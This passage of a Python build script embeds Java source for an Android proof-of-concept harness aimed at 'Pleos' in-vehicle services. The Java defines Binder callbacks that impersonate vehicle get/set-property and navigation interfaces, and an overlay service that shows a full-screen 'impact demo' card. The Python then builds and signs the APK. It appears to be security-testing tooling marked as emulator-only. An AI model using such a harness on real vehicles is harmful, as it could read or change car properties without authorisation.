final class VehicleSequenceRunner implements Runnable {
    private final PocActivity host;
    private final ComponentName name;
    private final IBinder service;

    VehicleSequenceRunner(PocActivity host, ComponentName name, IBinder service) {
        this.host = host;
        this.name = name;
        this.service = service;
    }

    @Override
    public void run() {
        host.runVehicleSequenceFromThread(name, service);
    }
}

final class VehicleGetCallbackBinder extends Binder {
    private final VehicleCallbackResult result;

    VehicleGetCallbackBinder(VehicleCallbackResult result) {
        this.result = result;
        attachInterface(null, "ai.pleos.playground.vehicle.callback.IGetPropertyResult");
    }

    @Override
    protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
        if (code == 1598968902) {
            if (reply != null) {
                reply.writeString("ai.pleos.playground.vehicle.callback.IGetPropertyResult");
            }
            return true;
        }
        try {
            if (code == 1) {
                data.enforceInterface("ai.pleos.playground.vehicle.callback.IGetPropertyResult");
                String propKey = data.readString();
                int areaId = data.readInt();
                String value = data.readString();
                result.markSuccess(propKey, areaId, value);
                return true;
            }
            if (code == 2) {
                data.enforceInterface("ai.pleos.playground.vehicle.callback.IGetPropertyResult");
                String propKey = data.readString();
                int areaId = data.readInt();
                String error = data.readString();
                result.markError(propKey, areaId, error);
                return true;
            }
            return super.onTransact(code, data, reply, flags);
        } catch (Throwable t) {
            result.markError("", 0, t.getClass().getName() + ":" + t.getMessage());
            return false;
        }
    }
}

final class VehicleSetCallbackBinder extends Binder {
    private final VehicleCallbackResult result;

    VehicleSetCallbackBinder(VehicleCallbackResult result) {
        this.result = result;
        attachInterface(null, "ai.pleos.playground.vehicle.callback.ISetPropertyResult");
    }

    @Override
    protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
        if (code == 1598968902) {
            if (reply != null) {
                reply.writeString("ai.pleos.playground.vehicle.callback.ISetPropertyResult");
            }
            return true;
        }
        try {
            if (code == 1) {
                data.enforceInterface("ai.pleos.playground.vehicle.callback.ISetPropertyResult");
                String propKey = data.readString();
                int valueType = data.readInt();
                String value = data.readString();
                result.markSuccess(propKey, valueType, value);
                return true;
            }
            if (code == 2) {
                data.enforceInterface("ai.pleos.playground.vehicle.callback.ISetPropertyResult");
                String propKey = data.readString();
                int valueType = data.readInt();
                String error = data.readString();
                result.markError(propKey, valueType, error);
                return true;
            }
            return super.onTransact(code, data, reply, flags);
        } catch (Throwable t) {
            result.markError("", 0, t.getClass().getName() + ":" + t.getMessage());
            return false;
        }
    }
}

final class NaviCallbackBinder extends Binder {
    private final PocActivity host;
    private final String marker;

    NaviCallbackBinder(PocActivity host, String marker) {
        this.host = host;
        this.marker = marker;
        attachInterface(null, "ai.pleos.playground.navi.INaviServiceCallback");
    }

    @Override
    protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
        if (code == 1598968902) {
            if (reply != null) {
                reply.writeString("ai.pleos.playground.navi.INaviServiceCallback");
            }
            return true;
        }
        if (code == 1) {
            data.enforceInterface("ai.pleos.playground.navi.INaviServiceCallback");
            String type = data.readString();
            String payload = data.readString();
            host.onNaviCallbackReceived(type, payload, payload != null && payload.contains(marker));
            return true;
        }
        try {
            return super.onTransact(code, data, reply, flags);
        } catch (Throwable t) {
            return false;
        }
    }
}
"""


OVERLAY_SERVICE_SOURCE = r"""
package org.codex.pleos.poc;

import android.app.Service;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.os.IBinder;
import android.util.Base64;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.ScrollView;
import android.widget.TextView;

public final class PocOverlayService extends Service {
    private static final String ACTION_HIDE = "org.codex.pleos.poc.OVERLAY_HIDE";
    private WindowManager windowManager;
    private View currentView;

    @Override
    public void onCreate() {
        super.onCreate();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && ACTION_HIDE.equals(intent.getAction())) {
            hideOverlay();
            stopSelf();
            return START_NOT_STICKY;
        }
        showOverlay(
                extra(intent, "kicker", "PoC Impact Demo"),
                extra(intent, "title", "Boundary Card"),
                extra(intent, "body", "No card body provided."),
                extra(intent, "footer", "emulator-only / redacted evidence"));
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        hideOverlay();
        super.onDestroy();
    }

    private String extra(Intent intent, String key, String fallback) {
        if (intent == null) {
            return fallback;
        }
        String encoded = intent.getStringExtra(key + "_b64");
        if (encoded != null && encoded.length() > 0) {
            try {
                byte[] bytes = Base64.decode(encoded, Base64.NO_WRAP);
                return new String(bytes, java.nio.charset.StandardCharsets.UTF_8).replace("\\n", "\n");
            } catch (Throwable ignored) {
                return fallback;
            }
        }
        String value = intent.getStringExtra(key);
        if (value == null || value.length() == 0) {
            return fallback;
        }
        return value.replace("\\n", "\n");
    }

    private void showOverlay(String kicker, String title, String body, String footer) {
        hideOverlay();

        TextView view = new TextView(this);
        view.setTextColor(Color.rgb(17, 24, 39));
        view.setTextSize(30);
        view.setTypeface(Typeface.MONOSPACE);
        view.setGravity(Gravity.START);
        view.setLineSpacing(6.0f, 1.0f);
        view.setPadding(86, 78, 86, 78);
        view.setText(
                kicker + "\n\n"
                        + title + "\n"
                        + "========================================\n\n"
                        + body + "\n\n"
                        + footer + "\n");

        ScrollView scrollView = new ScrollView(this);
        scrollView.setFillViewport(true);
        scrollView.setBackgroundColor(0xF7FFFFFF);
        scrollView.addView(view);

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.TOP | Gravity.START;

        windowManager.addView(scrollView, params);
        currentView = scrollView;
    }

    private void hideOverlay() {
        if (currentView == null || windowManager == null) {
            currentView = null;
            return;
        }
        try {
            windowManager.removeView(currentView);
        } catch (Throwable ignored) {
            // The overlay may already have been removed by the window manager.
        }
        currentView = null;
    }
}
"""


def run(cmd: list[str], *, cwd: Path | None = None) -> None:
    print("+ " + " ".join(str(c) for c in cmd))
    subprocess.run(cmd, cwd=cwd, check=True)


def find_android_sdk() -> Path:
    candidates = []
    env = os.environ.get("ANDROID_HOME") or os.environ.get("ANDROID_SDK_ROOT")
    if env:
        candidates.append(Path(env))
    local = os.environ.get("LOCALAPPDATA")
    if local:
        candidates.append(Path(local) / "Android" / "Sdk")
    for candidate in candidates:
        if (candidate / "platforms" / "android-34" / "android.jar").exists():
            return candidate
    raise SystemExit("Android SDK with android-34 was not found")


def newest_build_tools(sdk: Path) -> Path:
    build_tools = sdk / "build-tools"
    versions = sorted([p for p in build_tools.iterdir() if p.is_dir()], key=lambda p: p.name)
    if not versions:
        raise SystemExit("No Android build-tools found")
    return versions[-1]


def ensure_debug_keystore(path: Path) -> None:
    if path.exists():
        return
    run(
        [
            "keytool",
            "-genkeypair",
            "-keystore",
            str(path),
            "-storepass",
            "android",
            "-keypass",
            "android",
            "-alias",
            "androiddebugkey",
            "-keyalg",
            "RSA",
            "-keysize",
            "2048",
            "-validity",
            "10000",
            "-dname",
            "CN=Android Debug,O=Android,C=US",
        ]
    )


def build() -> Path:
    sdk = find_android_sdk()
    build_tools = newest_build_tools(sdk)
    android_jar = sdk / "platforms" / "android-34" / "android.jar"
    aapt2 = build_tools / "aapt2.exe"
    d8 = build_tools / "d8.bat"
    apksigner = build_tools / "apksigner.bat"

    if WORKDIR.exists():
        shutil.rmtree(WORKDIR)
    src_dir = WORKDIR / "src" / "org" / "codex" / "pleos" / "poc"
    classes_dir = WORKDIR / "classes"
    dex_dir = WORKDIR / "dex"
    src_dir.mkdir(parents=True, exist_ok=True)
    classes_dir.mkdir(parents=True, exist_ok=True)
    dex_dir.mkdir(parents=True, exist_ok=True)

    (WORKDIR / "AndroidManifest.xml").write_text(MANIFEST, encoding="utf-8")
    (src_dir / "PocActivity.java").write_text(textwrap.dedent(JAVA_SOURCE).strip() + "\n", encoding="utf-8")
    (src_dir / "PocOverlayService.java").write_text(
        textwrap.dedent(OVERLAY_SERVICE_SOURCE).strip() + "\n", encoding="utf-8"
    )
    java_files = sorted(str(path) for path in src_dir.glob("*.java"))

    run(
        [
            "javac",
            "-source",
            "8",
            "-target",
            "8",
            "-classpath",
            str(android_jar),
            "-d",
            str(classes_dir),
            *java_files,
        ]
    )
    classes_jar = WORKDIR / "classes.jar"
    with zipfile.ZipFile(classes_jar, "w") as jar:
        for class_file in classes_dir.rglob("*.class"):
            jar.write(class_file, class_file.relative_to(classes_dir).as_posix())
    run([str(d8), "--min-api", "23", "--lib", str(android_jar), "--output", str(dex_dir), str(classes_jar)])

    unsigned_apk = WORKDIR / "poc-harness-unsigned.apk"
    aligned_apk = WORKDIR / "poc-harness-aligned.apk"
    signed_apk = WORKDIR / "poc-harness-signed.apk"
    run(
        [
            str(aapt2),
            "link",
            "-o",
            str(unsigned_apk),
            "--manifest",
            str(WORKDIR / "AndroidManifest.xml"),
            "-I",
            str(android_jar),
        ]
    )
    with zipfile.ZipFile(unsigned_apk, "a") as apk:
        apk.write(dex_dir / "classes.dex", "classes.dex")

    zipalign = build_tools / "zipalign.exe"
    run([str(zipalign), "-f", "4", str(unsigned_apk), str(aligned_apk)])

    keystore = WORKDIR / "debug.keystore"
    ensure_debug_keystore(keystore)
    run(
        [
            str(apksigner),
            "sign",
            "--ks",
            str(keystore),
            "--ks-pass",
            "pass:android",
            "--key-pass",
            "pass:android",
            "--out",
            str(signed_apk),
            str(aligned_apk),
        ]
    )
    run([str(apksigner), "verify", str(signed_apk)])
    print(f"APK={signed_apk}")
    print(f"PACKAGE={PACKAGE}")
    print(f"ACTIVITY={ACTIVITY}")
    print(f"MARKER={MARKER}")
    return signed_apk


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--build", action="store_true", help="build the harness APK")
    args = parser.parse_args()
    if not args.build:
        parser.error("currently only --build is supported")
    build()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
